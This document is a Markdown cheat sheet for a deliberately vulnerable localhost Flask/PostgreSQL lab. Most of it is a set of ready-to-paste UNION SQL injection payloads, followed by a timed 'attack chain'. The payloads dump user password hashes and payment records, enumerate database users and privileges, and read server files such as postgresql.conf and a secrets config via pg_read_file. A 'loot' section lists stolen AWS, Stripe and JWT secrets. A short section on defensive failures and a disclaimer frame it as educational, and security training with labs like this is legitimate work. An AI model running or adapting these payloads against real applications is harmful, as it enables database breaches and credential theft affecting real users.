# 🎯 Quick Reference: Database Configuration Extraction

## Environment Variables vs Database Configuration

### ❌ What You CANNOT Get
- Flask application's environment variables (DB_PASSWORD, API keys set in docker-compose)
- Container-level environment variables from other processes
- Host system environment variables

**Why?** PostgreSQL runs in a separate process and cannot access Flask's memory/environment.

### ✅ What You CAN Get
- Database connection information (user, database name, version)
- PostgreSQL configuration settings and file paths
- Application data from database tables (including password hashes!)
- Files accessible to PostgreSQL process (config files, logs)
- Database metadata (tables, columns, schemas)
- Active database connections and sessions

---

## 🔥 Top 10 Payloads for Configuration Extraction

### 1. Database Fingerprint (One-Shot)
```
?id=1 UNION SELECT 1, 2, 'INFO', 0.00, CONCAT('DB: ', current_database(), ' | User: ', current_user, ' | ', substring(version() from 1 for 40)), 'fingerprint', CURRENT_TIMESTAMP
```

### 2. List All Tables
```
?id=1 UNION SELECT 1, 2, tablename, 0.00, schemaname, 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname = 'public'
```

### 3. Extract User Credentials
```
?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users
```

### 4. List Database Users & Privileges
```
?id=1 UNION SELECT 1, 2, usename, 0.00, CONCAT('superuser: ', usesuper::text, ' | createdb: ', usecreatedb::text), 'users', CURRENT_TIMESTAMP FROM pg_user
```

### 5. Get Configuration File Paths
```
?id=1 UNION SELECT 1, 2, name, 0.00, setting, 'config', CURRENT_TIMESTAMP FROM pg_settings WHERE name IN ('config_file', 'data_directory', 'hba_file')
```

### 6. List All Databases
```
?id=1 UNION SELECT 1, 2, datname, 0.00, pg_encoding_to_char(encoding), 'databases', CURRENT_TIMESTAMP FROM pg_database
```

### 7. Read Database Config File
```
?id=1 UNION SELECT 1, 2, 'postgresql.conf', 0.00, pg_read_file('/var/lib/postgresql/data/postgresql.conf'), 'config', CURRENT_TIMESTAMP
```

### 8. Read Application Config (JACKPOT!)
```
?id=1 UNION SELECT 1, 2, 'dbconf.ini', 0.00, pg_read_file('/dbconf.ini'), 'app_config', CURRENT_TIMESTAMP
```

### 9. Active Database Connections
```
?id=1 UNION SELECT 1, 2, usename, 0.00, CONCAT('db: ', datname, ' | client: ', COALESCE(client_addr::text, 'local'), ' | state: ', state), 'connections', CURRENT_TIMESTAMP FROM pg_stat_activity WHERE pid != pg_backend_pid()
```

### 10. List Columns for Table
```
?id=1 UNION SELECT 1, 2, column_name, 0.00, data_type, table_name, CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
```

---

## 📊 Information Hierarchy

```
Priority 1: Application Config Files 🥇
├─ /dbconf.ini (DB passwords, API keys, secrets)
└─ /app/.env (if exists)

Priority 2: Database Tables 🥈
├─ users (password hashes to crack)
├─ payments (financial data)
└─ feedback (potential stored XSS)

Priority 3: Database Metadata 🥉
├─ Table names (information_schema)
├─ Column names (information_schema)
└─ Database structure

Priority 4: PostgreSQL Configuration 🏅
├─ pg_settings (configuration)
├─ pg_user (database users)
└─ pg_database (all databases)

Priority 5: System Files 🏅
├─ /etc/passwd (system users)
├─ /var/lib/postgresql/data/postgresql.conf
└─ /var/lib/postgresql/data/pg_hba.conf
```

---

## 🎬 Complete Attack Chain

### Step 1: Initial Reconnaissance (30 seconds)
```sql
-- Get database info
?id=1 UNION SELECT 1, 2, current_database(), 0.00, current_user, version(), CURRENT_TIMESTAMP
```

### Step 2: Schema Discovery (1 minute)
```sql
-- List all tables
?id=1 UNION SELECT 1, 2, tablename, 0.00, schemaname, 'tables', CURRENT_TIMESTAMP FROM pg_tables WHERE schemaname = 'public'

-- Get columns for interesting tables
?id=1 UNION SELECT 1, 2, column_name, 0.00, data_type, 'users', CURRENT_TIMESTAMP FROM information_schema.columns WHERE table_name='users'
```

### Step 3: Data Extraction (2 minutes)
```sql
-- Extract user credentials
?id=1 UNION SELECT id, id, username, 0.00, password_hash, email, created_at FROM users

-- Extract payment data
?id=1 UNION SELECT id, user_id, recipient, amount, description, status, created_at FROM payments WHERE amount > 100
```

### Step 4: Configuration Files (1 minute)
```sql
-- Read application config (HIGHEST VALUE!)
?id=1 UNION SELECT 1, 2, 'CONFIG', 0.00, pg_read_file('/dbconf.ini'), 'JACKPOT', CURRENT_TIMESTAMP
```

### Step 5: Privilege Escalation (5 minutes)
- Crack extracted password hashes with hashcat
- Use credentials from config files
- Login as admin
- Full system access!

**Total Time**: ~10 minutes from SQLi discovery to complete compromise

---

## 💰 Expected Loot

### From Database Tables:
- ✅ 3 user accounts with password hashes
- ✅ 23 payment transactions with amounts
- ✅ Email addresses and user information
- ✅ Admin privileges identification

### From Config Files:
- ✅ Database passwords (production + backup)
- ✅ Redis password
- ✅ Stripe API keys (test mode, but demonstrates concept)
- ✅ AWS access keys
- ✅ SendGrid API key
- ✅ JWT secrets
- ✅ Monitoring service keys (Datadog, Sentry, NewRelic)

### Total Value:
- 🔴 **CRITICAL** - Complete system compromise
- 💰 **Business Impact**: Millions in potential damage
- 📊 **Data Breach**: All customer data exposed
- 🔑 **Lateral Movement**: Access to external services
- ⚡ **Privilege Escalation**: Admin account access

---

## 🛡️ Why This Works

### The Vulnerability Stack

```
Layer 1: SQL Injection
   ↓ (Allows arbitrary SQL execution)
Layer 2: Excessive Database Privileges
   ↓ (DB user can read files with pg_read_file)
Layer 3: Plaintext Secrets in Files
   ↓ (Config files contain unencrypted credentials)
Layer 4: No Input Validation
   ↓ (User input flows directly into SQL)
Layer 5: Detailed Error Messages
   ↓ (SQL errors help attacker refine payloads)
   
Result: COMPLETE COMPROMISE 💥
```

### Defense in Depth Failures

Each layer that fails makes the attack easier:
- ❌ No parameterized queries
- ❌ DB user has file reading privileges
- ❌ Secrets stored in plaintext files
- ❌ No Web Application Firewall (WAF)
- ❌ No input sanitization
- ❌ No rate limiting
- ❌ No anomaly detection

**Fix ANY ONE of these** → Attack becomes much harder  
**Fix ALL of these** → Attack becomes nearly impossible

---

## 🎓 Key Learnings

1. **Environment variables** aren't accessible across process boundaries
2. **Config files** are the next best target for credential theft
3. **Database tables** contain password hashes that can be cracked
4. **Metadata queries** reveal database structure for targeted attacks
5. **File reading** functions are extremely dangerous when available
6. **Multiple vulnerabilities** chain together for maximum impact

---

## 📚 Related Documentation

- **SQLI_ENVIRONMENT_EXTRACTION.md** - Detailed guide on environment extraction
- **POSTGRES_SQLI_PAYLOADS.md** - Complete payload library (500+ lines!)
- **CONFIG_FILE_ATTACK.md** - Configuration file exploitation guide
- **QUICK_REFERENCE.md** - 30-second startup guide

---

## 🚀 Try It Now!

**Application**: http://localhost:5000  
**Login**: alice / password123  
**Vulnerable page**: Status → Payment ID field

**Quick test:**
```
http://localhost:5000/status?id=1 UNION SELECT 1, 2, current_database(), 0.00, current_user, version(), CURRENT_TIMESTAMP
```

You should see the database name and user appear in the payment details! 🎉

---

**Remember**: This is for educational purposes only. Never perform SQL injection on systems you don't own or have explicit permission to test! 🔒
